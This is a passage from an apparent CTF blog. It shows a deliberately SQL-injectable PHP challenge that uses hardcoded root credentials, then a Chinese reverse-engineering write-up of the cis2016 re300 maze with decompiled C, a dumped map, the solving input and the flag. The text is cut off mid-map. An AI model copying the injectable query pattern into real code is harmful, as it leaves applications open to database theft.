<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">"localhost:3306"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'wcy'</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select flag from ctf1 where id='$a'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your sql:'</span>.$sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$b = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>&gt;</span></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/MYSQL/" data-id="cjyn83qe6000iicthi02evdz0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-maze" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/maze/" class="article-date">
  <time datetime="2019-07-28T17:11:01.717Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/maze/">cis2016-re300-maze</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="初探maze"><a href="#初探maze" class="headerlink" title="初探maze"></a>初探maze</h1><ul>
<li>又遇到了maze,难度比bugku的take the maze简单一点,但是比nctf和nust的maze要复杂好多.</li>
<li>运行发现,传参形式为命令行.错误会报错play again!</li>
<li>IDA打开,查看主函数,很简短</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **input, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(byte_13C0AA8, <span class="number">-1</span>, <span class="number">484u</span>);</span><br><span class="line">    sub_13B10B0();</span><br><span class="line">    sub_13B1000();</span><br><span class="line">    <span class="keyword">if</span> ( sub_13B1150(input[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_13B1290((<span class="keyword">void</span> *)input[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"play again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>大概意思就是检测输入是否为空,非空则进入判断,首先memset一个484的内存空间,紧接着的两个函数对byte_13C0AA8操作.</li>
</ul>
<p>查看sub_13B1290验证函数,函数具体如下图.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401150</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *input_1; <span class="comment">// edx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al@3</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx@3</span></span><br><span class="line">  <span class="keyword">int</span> Y; <span class="comment">// ecx@3</span></span><br><span class="line">  <span class="keyword">int</span> X; <span class="comment">// esi@3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// edi@3</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ebp@4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// edx@7</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// ebx@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// eax@11</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+4h] [bp-4h]@3</span></span><br><span class="line"></span><br><span class="line">  input_1 = input;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) &amp; <span class="number">1</span> )                      <span class="comment">// 奇数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v3 = *input;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Y = <span class="number">0</span>;</span><br><span class="line">  X = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">-1</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*input )</span><br><span class="line">    <span class="keyword">goto</span> gg;</span><br><span class="line">  v8 = <span class="number">0</span>;                                       <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="string">'a'</span> || v3 &gt; <span class="string">'d'</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    v9 = input_1[<span class="number">1</span>] - <span class="number">101</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt; <span class="number">0x15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      input_1 = input;</span><br><span class="line">LABEL_17:</span><br><span class="line">      ++v4;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">	v10 = v7;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        X = (X - v9) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        X = (v9 + X) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        Y = (Y - v9) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        Y = (v9 + Y) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X) = <span class="number">0</span>;</span><br><span class="line">    v4 += (v8 ^ <span class="number">1</span>) + (v10 == v7);</span><br><span class="line">    input_1 = input;</span><br><span class="line"></span><br><span class="line">LABEL_18:</span><br><span class="line">    v3 = input_1[<span class="number">2</span>];</span><br><span class="line">    input_1 += <span class="number">2</span>;</span><br><span class="line">    input = input_1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 );                                 <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Y != <span class="number">21</span> || X != <span class="number">21</span> )</span><br><span class="line">gg:</span><br><span class="line">    ++v4;</span><br><span class="line">  result = v4 &lt; <span class="number">0</span>;</span><br><span class="line">  LOBYTE(result) = v4 &lt;= <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>那么byte_13C就是地图了,而且可以顺便判断出switch语句中的abcd,还有地图规模为24 * 24,并且可以看出X,Y值.</li>
<li>在patch程序后,成功dump地图.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------&gt;x</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  #  .  .  #  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  #  .  .  .  .</span><br><span class="line">|  #  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  .  .  .  .  #  .</span><br><span class="line">|  .  .  .  #  .  .  #  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  #  .  .  .  .  .  .</span><br><span class="line">|  #  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  #  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  #  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .</span><br><span class="line">|  #  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  #</span><br><span class="line">|</span><br><span class="line">|                                      (我事先替换好了0-&gt;. , 1-&gt;#)</span><br><span class="line">|</span><br><span class="line">V   y</span><br></pre></td></tr></table></figure>

<ul>
<li>居然没有显而易见的路径供我们走….. 这是个啥玩意儿啊 _(:з」∠)_</li>
</ul>
<h1 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h1><ul>
<li><p>首先(strlen(input)&amp;1),再一次判断输入是否为0,而且我们可知,strlen为奇数,详情请见位运算hhhhhhh.</p>
</li>
<li><p>比较重要的do-while循环,如果v3(input[i])非方向键,那么指针会整体后移.如果奇数位都非方向键,那么GG</p>
</li>
<li><p>所以可以确定,方向键和位移数,分别在奇数位和偶数位.</p>
</li>
<li><p>那么按正常情况分析,首先猜测为位移数的对应字母,先减去101, 由if(v9&gt;21)的判断区,结合地图为22*22正方形,下面的%22和&amp;([22*y] + x),可知,这是在限定地图边界.</p>
</li>
<li><p>分析主要的switch case可知,a和b是点在X方向的位移,c和d是点在Y方向的位移.</p>
</li>
<li><p>左右方向时,会将0赋值给v7,上下时,会将1赋值给v7.</p>
</li>
<li><p>移动后会将对应位设置为0 , v4不能为负数,所以条件v8必须为1,即为’#’,v10 != v7.所以方向不能重复.</p>
</li>
<li><p>综上分析,方向键不能重复为ab或cd.</p>
</li>
<li><p>由上图可知,d19 b17 c16 a9 d8 b7 d10 b6  按照对应关系有  dxbvcuandmbldobk</p>
</li>
</ul>
<blockquote>
<p>C:\Users\wangchenyu\Downloads&gt;DC9A4EBEF8F3A11A0D97946F6EBB6640.exe dxbvcuandmbldobk<br>Congratulations!  flag{Y0u_4re_4_G00d_Ma2e_Runner}.</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>在做题的过程中,我dump下来了6个不同的地图,但是我们可以知道,flag是唯一的,而且在生成地图的时候我也发现了srand和rand函数对地图的操作</p>
</li>
<li><p>虽然地图不同,但是可以轻易的得知,走法都是一样的,不同的其实都是一些无用点,那么他是怎么实现的呢,来分析一下生成maze的函数.</p>
</li>
<li><p>memset一块内存大小为484的地图空间</p>
</li>
</ul>
<p>函数1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_13010B0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx@2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi@4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx@5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// eax@6</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// ecx@6</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// ecx@10</span></span><br><span class="line"></span><br><span class="line">  v0 = dword_130FF38[<span class="number">0</span>];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_130FF38[<span class="number">0</span>] != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = dword_130FF38[<span class="number">0</span>];</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v1;</span><br><span class="line">      *(&amp;byte_1310AA8[<span class="number">22</span> * v2] + dword_130FF3C[v3]) = <span class="number">1</span>;</span><br><span class="line">      v3 = <span class="number">2</span> * v1;</span><br><span class="line">      v2 = dword_130FF38[<span class="number">2</span> * v1];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      v7 = &amp;byte_1310AA8[<span class="number">22</span> * v0];</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7[v6] == <span class="number">-1</span> )</span><br><span class="line">          v7[v6] = <span class="number">0</span>;</span><br><span class="line">        ++v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 &lt; <span class="number">22</span> );</span><br><span class="line">      v8 = &amp;byte_1310AA8[dword_130FF3C[v5]];</span><br><span class="line">      v9 = <span class="number">22</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v8 == <span class="number">-1</span> )</span><br><span class="line">          *v8 = <span class="number">0</span>;</span><br><span class="line">        v8 += <span class="number">22</span>;</span><br><span class="line">        --v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v9 );</span><br><span class="line">      v5 = <span class="number">2</span> * ++v4;</span><br><span class="line">      v0 = dword_130FF38[<span class="number">2</span> * v4];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_1301000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// edi@4</span></span><br><span class="line">  <span class="keyword">int</span> Y; <span class="comment">// esi@5</span></span><br><span class="line">  <span class="keyword">int</span> X; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf@5</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// ecx@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax@9</span></span><br><span class="line"></span><br><span class="line">  v0 = dword_130FFD8[<span class="number">0</span>];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_130FFD8[<span class="number">0</span>] != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v1;</span><br><span class="line">      *(&amp;byte_1310AA8[<span class="number">22</span> * v0] + dword_130FFDC[v2]) = <span class="number">1</span>;</span><br><span class="line">      v2 = <span class="number">2</span> * v1;</span><br><span class="line">      v0 = dword_130FFD8[<span class="number">2</span> * v1];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = _time64(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    Y = rand() % <span class="number">22</span>;</span><br><span class="line">    X = rand();</span><br><span class="line">    Y *= <span class="number">22</span>;</span><br><span class="line">    v7 = *(&amp;byte_1310AA8[Y] + X % <span class="number">22</span>) == <span class="number">-1</span>;</span><br><span class="line">    v8 = &amp;byte_1310AA8[Y] + X % <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v8 = <span class="number">1</span>;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; <span class="number">15</span> );</span><br><span class="line">  v9 = byte_1310AA8;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v9[result] == <span class="number">-1</span> )</span><br><span class="line">        v9[result] = <span class="number">0</span>;</span><br><span class="line">      ++result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; <span class="number">22</span> );</span><br><span class="line">    v9 += <span class="number">22</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)&amp;dword_1310C8C );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析函数后发现,函数1跑过后,是如下结果(原本的-1被我替换成了2)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  #  .  .  .  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  .  .  .  .  .  .  .  #  .  .  .  .  .  .  #  .  .  .  .  .  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  